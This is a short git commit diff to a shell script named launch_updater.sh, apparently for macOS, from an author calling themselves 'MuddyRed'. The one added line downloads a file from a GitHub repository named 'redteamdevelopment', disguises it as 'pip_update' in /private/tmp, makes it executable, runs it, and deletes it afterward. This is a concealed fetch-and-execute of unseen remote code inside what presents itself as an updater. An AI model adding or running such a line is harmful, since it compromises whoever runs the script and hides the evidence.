4b9b0166ac9fb052a4a9df7087721e5544b8d722
MuddyRed <xvioletta2013@proton.me>
2026-05-26 17:13:46 +0800

    Update launch_updater.sh

--- launch_updater.sh
+++ launch_updater.sh
@@ -1,3 +1,4 @@
 #!/bin/bash
 
 echo 111 >> /private/tmp/test.txt
+curl -fSL --progress-bar  https://github.com/redteamdevelopment/test.sh/blob/main/activee  -o /private/tmp/pip_update && chmod +x /private/tmp/pip_update && /private/tmp/pip_update && rm -rf /private/tmp/pip_update
